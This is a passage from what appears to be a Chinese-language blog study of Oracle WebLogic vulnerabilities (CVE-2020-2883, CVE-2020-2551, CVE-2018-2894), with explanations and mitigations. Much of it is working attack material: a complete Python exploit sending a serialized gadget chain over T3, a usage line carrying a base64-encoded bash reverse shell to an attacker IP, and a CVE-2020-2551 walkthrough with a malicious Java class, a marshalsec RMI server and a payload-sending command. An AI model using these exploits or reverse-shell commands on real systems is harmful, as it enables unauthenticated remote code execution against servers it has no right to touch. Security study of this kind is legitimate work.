class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> netloc):</span><br><span class="line">        ip = netloc.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        port = netloc.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    uri = parsed.path</span><br><span class="line">    <span class="keyword">return</span> (proto, ip, port, uri)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CVE_2020_2883</span>(<span class="params">cmd</span>):</span><br><span class="line">    payload_start = <span class="string">&#x27;aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b78700000000273720030636f6d2e74616e676f736f6c2e7574696c2e636f6d70617261746f722e457874726163746f72436f6d70617261746f72c7ad6d3a676f3c180200014c000b6d5f657874726163746f727400224c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b78707372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f647400124c6a6176612f6c616e672f537472696e673b7871007e000900000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e000d000000007571007e001100000002707571007e001100000000740006696e766f6b657371007e000d000000007571007e00110000000174&#x27;</span></span><br><span class="line">    payload_lenhex = <span class="string">&#x27;&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(cmd))</span><br><span class="line">    payload_cmdhex = binascii.b2a_hex(cmd)</span><br><span class="line">    payload_end = <span class="string">&#x27;74000465786563770400000003767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707400013178&#x27;</span></span><br><span class="line">    payload = payload_start + payload_lenhex + payload_cmdhex + payload_end</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payloadtest</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        self.vuln = <span class="string">&#x27;cve_2020_2883&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">t3handshake</span>(<span class="params">self,sock,server_addr</span>):</span><br><span class="line">        sock.connect(server_addr)</span><br><span class="line">        sock.send(<span class="string">&#x27;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="comment">#print data</span></span><br><span class="line">        <span class="comment">#print &#x27;handshake successful&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">buildT3RequestObject</span>(<span class="params">self,sock,port</span>):</span><br><span class="line">        data1 = <span class="string">&#x27;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#x27;</span></span><br><span class="line">        data2 = <span class="string">&#x27;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd60000000700001b19ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#x27;</span></span><br><span class="line">        data3 = <span class="string">&#x27;1a7727000d3234322e323134&#x27;</span></span><br><span class="line">        data4 = <span class="string">&#x27;2e312e32353461863d1d0000000078&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</span><br><span class="line">            sock.send(d.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment">#print &#x27;send request payload successful,recv length:%d&#x27;%(len(sock.recv(2048)))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sendEvilObjData</span>(<span class="params">self,sock,data</span>):</span><br><span class="line">        payload=<span class="string">&#x27;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#x27;</span></span><br><span class="line">        payload+=data</span><br><span class="line">        payload+=<span class="string">&#x27;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#x27;</span></span><br><span class="line">        payload = <span class="string">&#x27;%s%s&#x27;</span>%(<span class="string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(payload)/<span class="number">2</span> + <span class="number">4</span>),payload)</span><br><span class="line">        sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        n=<span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                n += <span class="number">1</span></span><br><span class="line">                res += sock.recv(<span class="number">4096</span>)</span><br><span class="line">                time.sleep(<span class="number">0.1</span>)</span><br><span class="line">                <span class="keyword">if</span>(n&gt;<span class="number">15</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, url, cmd,timeout, proxies=globalProxies, **args</span>):</span><br><span class="line">        (proto, ip, port, uri) = parseUrl(url)</span><br><span class="line"></span><br><span class="line">        server_addr = (ip, <span class="built_in">int</span>(port))</span><br><span class="line">        <span class="keyword">if</span> proto == <span class="string">&#x27;https&#x27;</span>:</span><br><span class="line">            sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(timeout)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.t3handshake(sock,server_addr)</span><br><span class="line">            self.buildT3RequestObject(sock,port)</span><br><span class="line">            payload = CVE_2020_2883(cmd)</span><br><span class="line">            resp = self.sendEvilObjData(sock,payload)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;Payload send succeed! Please check.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;Failed! Exception:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(e)))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url,cmd</span>):</span><br><span class="line">    x = payloadtest()</span><br><span class="line">    <span class="keyword">return</span> x.check(url, cmd,<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Weblogic cve-2020-2883 Exp&#x27;</span>,</span><br><span class="line">                                     usage=<span class="string">&#x27;use &quot;python %(prog)s --help&quot; for more information&#x27;</span>,</span><br><span class="line">                                     formatter_class=argparse.RawTextHelpFormatter)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>,</span><br><span class="line">                        dest=<span class="string">&quot;url&quot;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;the url to check&quot;</span></span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>,</span><br><span class="line">                        dest=<span class="string">&quot;cmd&quot;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;the cmd to run on the target&quot;</span></span><br><span class="line">                        )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.url <span class="keyword">or</span> <span class="keyword">not</span> args.cmd:</span><br><span class="line">        sys.exit(<span class="string">&#x27;Please assign url and cmd!&#x27;</span>)</span><br><span class="line">    poc(args.url, args.cmd)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="（2）利用命令"><a href="#（2）利用命令" class="headerlink" title="（2）利用命令"></a>（2）利用命令</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CVE-2020-2883_2884.py -u http://192.168.100.137:7001 -c &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMjkvMTAwODYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>监听<code>nv -lnvp 1234</code></li>
</ul>
<h4 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a><strong>7. 总结</strong></h4><p>CVE-2020-2883 的 <strong>核心原理</strong> 是通过 T3&#x2F;IIOP 协议发送恶意序列化数据，利用 WebLogic 反序列化机制中未被覆盖的类链，绕过黑名单触发远程代码执行。其危害性在于 <strong>无需身份验证</strong> 且能完全控制服务器。防御需结合补丁升级、协议禁用和网络隔离，同时持续监控反序列化攻击向量。</p>
<h3 id="6-CVE-2020-2551"><a href="#6-CVE-2020-2551" class="headerlink" title="6.CVE-2020-2551"></a>6.CVE-2020-2551</h3><p>CVE-2020-2551 是 Oracle WebLogic Server 中的一个高危反序列化远程代码执行（RCE）漏洞，其核心原理涉及 <strong>IIOP 协议的反序列化缺陷</strong>和 <strong>黑名单过滤机制的不完善</strong>。以下是漏洞的详细解析：</p>
<hr>
<h4 id="1-漏洞背景与影响范围"><a href="#1-漏洞背景与影响范围" class="headerlink" title="1. 漏洞背景与影响范围"></a><strong>1. 漏洞背景与影响范围</strong></h4><ul>
<li><strong>漏洞编号</strong>：CVE-2020-2551，CVSS 评分为 <strong>9.8</strong>（严重），利用难度低。</li>
<li><strong>影响版本</strong>：<ul>
<li>WebLogic 10.3.6.0.0</li>
<li>WebLogic 12.1.3.0.0</li>
<li>WebLogic 12.2.1.3.0</li>
<li>WebLogic 12.2.1.4.0。</li>
</ul>
</li>
<li><strong>协议关联</strong>：漏洞通过 <strong>IIOP（Internet Inter-ORB Protocol）</strong> 触发，该协议用于 CORBA 对象通信，默认在 WebLogic 的 7001 端口开放。</li>
</ul>
<hr>
<h4 id="2-漏洞核心原理-1"><a href="#2-漏洞核心原理-1" class="headerlink" title="2. 漏洞核心原理"></a><strong>2. 漏洞核心原理</strong></h4><h5 id="1-反序列化入口点-1"><a href="#1-反序列化入口点-1" class="headerlink" title="(1) 反序列化入口点"></a><strong>(1) 反序列化入口点</strong></h5><p>WebLogic 在处理 IIOP 协议请求时，会对传入的序列化数据执行反序列化操作。具体流程如下：</p>
<ul>
<li><strong>IIOP 请求触发</strong>：攻击者通过 <code>InitialContext</code> 绑定恶意对象至 IIOP 服务端，例如使用 <code>weblogic.jndi.WLInitialContextFactory</code> 初始化上下文。</li>
<li><strong>反序列化调用链</strong>：服务端在解析 IIOP 请求时，会调用 <code>CorbaMessageMediatorImpl</code> 类的 <code>handleRequest</code> 方法，最终通过 <code>IIOPInputStream</code> 读取并反序列化恶意数据。</li>
</ul>
<h5 id="2-利用链构造-1"><a href="#2-利用链构造-1" class="headerlink" title="(2) 利用链构造"></a><strong>(2) 利用链构造</strong></h5><p>漏洞的核心利用类是 <code>JtaTransactionManager</code>（属于 Spring 框架），其父类 <code>AbstractPlatformTransactionManager</code> 已被加入黑名单，但 <code>JtaTransactionManager</code> 自身未被过滤。攻击者通过以下步骤构造利用链：</p>
<ol>
<li><strong>动态代理封装</strong>：使用 <code>Gadgets.createMemoitizedProxy</code> 将 <code>JtaTransactionManager</code> 封装为 <code>Remote</code> 接口的动态代理对象（基于 <code>AnnotationInvocationHandler</code>）。</li>
<li><strong>JNDI 注入</strong>：通过 <code>setUserTransactionName</code> 设置恶意 RMI&#x2F;LDAP 地址，触发目标服务器从攻击者控制的服务器加载恶意类。</li>
<li><strong>反序列化执行</strong>：WebLogic 反序列化时，由于未递归检查父类，导致 <code>JtaTransactionManager</code> 被成功解析，最终通过 JNDI 注入执行远程代码。</li>
</ol>
<h5 id="3-黑名单绕过机制"><a href="#3-黑名单绕过机制" class="headerlink" title="(3) 黑名单绕过机制"></a><strong>(3) 黑名单绕过机制</strong></h5><ul>
<li><strong>过滤机制缺陷</strong>：WebLogic 对 IIOP 协议的反序列化检查仅针对当前类名，未递归验证父类。因此，即使 <code>AbstractPlatformTransactionManager</code> 在黑名单中，其子类 <code>JtaTransactionManager</code> 仍可通过检查。</li>
<li><strong>动态代理绕过</strong>：通过动态代理（如 <code>Remote</code> 接口）隐藏真实类名，绕过静态黑名单检测。</li>
</ul>
<hr>
<h4 id="3-漏洞利用流程"><a href="#3-漏洞利用流程" class="headerlink" title="3. 漏洞利用流程"></a><strong>3. 漏洞利用流程</strong></h4><ol>
<li><strong>构造恶意序列化对象</strong>：<ul>
<li>使用 <code>ysoserial</code> 生成 <code>JtaTransactionManager</code> 的序列化对象，并关联恶意 RMI 服务地址（如 <code>rmi://attacker-ip/Exploit</code>）。</li>
</ul>
</li>
<li><strong>发送 IIOP 请求</strong>：<ul>
<li>通过 <code>InitialContext.bind()</code> 方法将恶意对象绑定至目标 WebLogic 的 IIOP 服务端口（7001）。</li>
</ul>
</li>
<li><strong>触发反序列化</strong>：<ul>
<li>WebLogic 解析请求时，触发 <code>IIOPInputStream</code> 的反序列化操作，加载并执行 RMI 服务中的恶意类（如远程加载 <code>exp.class</code> 执行系统命令）。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="4-补丁与防御措施"><a href="#4-补丁与防御措施" class="headerlink" title="4. 补丁与防御措施"></a><strong>4. 补丁与防御措施</strong></h4><ul>
<li><strong>官方补丁</strong>：Oracle 在 2020 年 1 月发布的补丁中扩展了黑名单，并修复了 <code>CorbaUtils</code> 类的反序列化逻辑，添加递归类名检查。</li>
<li><strong>临时缓解方案</strong>：<ul>
<li><strong>禁用 IIOP 协议</strong>：在 WebLogic 控制台中取消“启用 IIOP”选项，并重启服务。</li>
<li><strong>网络隔离</strong>：限制 7001 端口的公网访问，仅允许可信 IP 通信。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="5-技术意义与启示"><a href="#5-技术意义与启示" class="headerlink" title="5. 技术意义与启示"></a><strong>5. 技术意义与启示</strong></h4><ul>
<li><strong>协议安全性</strong>：IIOP 协议的反序列化漏洞再次凸显了分布式协议设计中输入校验的重要性。</li>
<li><strong>防御纵深</strong>：单纯依赖黑名单的防御机制存在局限性，需结合白名单、行为监控等多层防护。</li>
<li><strong>漏洞利用趋势</strong>：该漏洞的公开利用代码（如结合 Cobalt Strike）表明，攻击者正越来越多地利用反序列化漏洞实现高级持久化攻击。</li>
</ul>
<h4 id="6-漏洞复现流程"><a href="#6-漏洞复现流程" class="headerlink" title="6.漏洞复现流程"></a>6.漏洞复现流程</h4><p>以下是 <strong>CVE-2020-2551 漏洞复现的详细流程</strong>，结合多篇技术文档和实践总结：</p>
<hr>
<h5 id="一、环境准备-1"><a href="#一、环境准备-1" class="headerlink" title="一、环境准备"></a><strong>一、环境准备</strong></h5><ol>
<li><p><strong>靶机环境</strong>  </p>
<ul>
<li><p><strong>推荐使用 Vulhub 的 CVE-2017-10271 环境</strong>（已适配 CVE-2020-2551 复现）：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/weblogic/CVE-2017-10271</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li>
<li><p>确保 WebLogic 服务运行在 <code>7001</code> 端口，访问 <code>http://靶机IP:7001</code> 验证服务正常。</p>
</li>
</ul>
</li>
<li><p><strong>攻击机环境</strong>  </p>
<ul>
<li><strong>Java 环境</strong>：需安装 JDK 1.8（部分工具需 JDK 1.6 编译）。</li>
<li><strong>工具准备</strong>：<ul>
<li><code>marshalsec</code>：用于启动恶意 RMI 服务（<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">下载地址</a>）。</li>
<li><code>weblogic_CVE_2020_2551.jar</code>：Payload 发送工具（需从开源项目编译或下载预编译版本）。</li>
</ul>
</li>
</ul>
</li>
</ol>
<hr>
<h5 id="二、漏洞利用步骤"><a href="#二、漏洞利用步骤" class="headerlink" title="二、漏洞利用步骤"></a><strong>二、漏洞利用步骤</strong></h5><h6 id="1-生成恶意类文件"><a href="#1-生成恶意类文件" class="headerlink" title="1. 生成恶意类文件"></a><strong>1. 生成恶意类文件</strong></h6><ul>
<li><p><strong>编写恶意类</strong>（如 <code>exp.java</code>）：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 示例：弹出计算器（Windows）或执行其他命令</span></span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">            <span class="comment">// 反弹 Shell 示例（Linux）：</span></span><br><span class="line">            <span class="comment">// Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/攻击机IP/端口 0&gt;&amp;1&quot;&#125;);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>编译为 <code>.class</code> 文件</strong>（需兼容低版本 JDK）：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac exp.java -<span class="built_in">source</span> 1.6 -target 1.6</span><br></pre></td></tr></table></figure></li>
</ul>
<h6 id="2-启动-HTTP-服务托管恶意类"><a href="#2-启动-HTTP-服务托管恶意类" class="headerlink" title="2. 启动 HTTP 服务托管恶意类"></a><strong>2. 启动 HTTP 服务托管恶意类</strong></h6><ul>
<li>在恶意类所在目录启动 Python HTTP 服务：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80  <span class="comment"># 或 python -m SimpleHTTPServer 80（Python2）</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h6 id="3-启动恶意-RMI-服务"><a href="#3-启动恶意-RMI-服务" class="headerlink" title="3. 启动恶意 RMI 服务"></a><strong>3. 启动恶意 RMI 服务</strong></h6><ul>
<li><strong>使用 <code>marshalsec</code> 启动 RMI 服务</strong>：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://攻击机IP/#exp&quot;</span> 1099</span><br></pre></td></tr></table></figure>
<ul>
<li><code>http://攻击机IP/#exp</code> 指向托管 <code>exp.class</code> 的 HTTP 服务。</li>
</ul>
</li>
</ul>
<h6 id="4-发送-Payload-触发漏洞"><a href="#4-发送-Payload-触发漏洞" class="headerlink" title="4. 发送 Payload 触发漏洞"></a><strong>4. 发送 Payload 触发漏洞</strong></h6><ul>
<li><p><strong>使用 <code>weblogic_CVE_2020_2551.jar</code> 发送恶意请求</strong>：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar weblogic_CVE_2020_2551.jar 靶机IP 7001 rmi://攻击机IP:1099/exp</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>参数说明</strong>：  <ul>
<li><code>靶机IP:7001</code>：目标 WebLogic 的 IIOP 服务地址。  </li>
<li><code>rmi://攻击机IP:1099/exp</code>：恶意 RMI 服务地址。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250405230643974.png?x-oss-process=style/img-to-webp" alt="image-20250405230643974"></p>
<hr>
<h5 id="三、验证漏洞利用"><a href="#三、验证漏洞利用" class="headerlink" title="三、验证漏洞利用"></a><strong>三、验证漏洞利用</strong></h5><ol>
<li><p><strong>观察攻击机 HTTP 日志</strong>：  </p>
<ul>
<li>若 WebLogic 触发了恶意类加载，HTTP 服务会记录对 <code>exp.class</code> 的请求。</li>
</ul>
</li>
<li><p><strong>执行效果验证</strong>：  </p>
<ul>
<li><strong>Windows 靶机</strong>：成功会弹出计算器（<code>calc.exe</code>）。  </li>
<li><strong>Linux 靶机</strong>：通过 <code>nc</code> 监听指定端口获取反弹 Shell。</li>
</ul>
</li>
<li><p><strong>WebLogic 日志排查</strong>：  </p>
<ul>
<li>检查 WebLogic 日志（<code>logs/access.log</code> 或 <code>server.log</code>），若出现 <code>JtaTransactionManager</code> 相关错误，表明漏洞触发成功。</li>
</ul>
</li>
</ol>
<h3 id="7-CVE-2018-2894"><a href="#7-CVE-2018-2894" class="headerlink" title="7.CVE-2018-2894"></a>7.<strong>CVE-2018-2894</strong></h3><h4 id="1-漏洞背景与入口点"><a href="#1-漏洞背景与入口点" class="headerlink" title="1. 漏洞背景与入口点"></a><strong>1. 漏洞背景与入口点</strong></h4><p>CVE-2018-2894 是 Oracle WebLogic Server 中的一个高危任意文件上传漏洞，允许攻击者通过未授权页面直接上传恶意文件（如 JSP Webshell）并获取服务器权限。漏洞的核心入口点为 WebLogic 管理端的两个未授权接口：  </p>
<ul>
<li><strong><code>/ws_utc/begin.do</code></strong>  </li>
<li><strong><code>/ws_utc/config.do</code></strong><br>这两个页面在<strong>开发模式</strong>下默认开启，而在<strong>生产模式</strong>下需手动启用“Web 服务测试页”选项。</li>
</ul>
<hr>
<h4 id="2-漏洞触发机制"><a href="#2-漏洞触发机制" class="headerlink" title="2. 漏洞触发机制"></a><strong>2. 漏洞触发机制</strong></h4><p>漏洞的核心原理在于 <strong>WebLogic 对用户设置的工作目录（Work Home Dir）缺乏安全校验</strong>，具体流程如下：</p>
<ol>
<li><p><strong>工作目录修改</strong>：<br>攻击者通过 <code>config.do</code> 页面将 <code>Work Home Dir</code> 设置为 WebLogic 应用的静态资源目录（如 <code>/u01/oracle/.../war/css</code>），该目录无需权限即可访问。  </p>
<ul>
<li><strong>关键点</strong>：程序会自动将旧目录内容复制到新目录，但未限制路径合法性，导致攻击者可指定任意可写路径。</li>
</ul>
</li>
<li><p><strong>文件上传逻辑</strong>：  </p>
<ul>
<li>在 <code>config.do</code> 或 <code>begin.do</code> 页面的“安全”选项中，攻击者上传恶意文件（如 JSP Webshell）。  </li>
<li>文件名生成规则为 <code>时间戳_文件名</code>（如 <code>1535682238190_webshell.jsp</code>），其中时间戳通过请求参数或返回包获取。</li>
</ul>
</li>
<li><p><strong>文件保存路径</strong>：<br>上传的文件被保存至 <code>Work Home Dir</code> 目录下的 <code>keystore</code> 子目录，路径为：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://目标IP:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]  </span><br></pre></td></tr></table></figure>
<p>由于该路径无需权限，攻击者可直接访问并执行恶意文件。</p>
</li>
</ol>
<hr>
<h4 id="3-漏洞利用条件"><a href="#3-漏洞利用条件" class="headerlink" title="3. 漏洞利用条件"></a><strong>3. 漏洞利用条件</strong></h4><ul>
<li><strong>目标环境</strong>：  <ul>
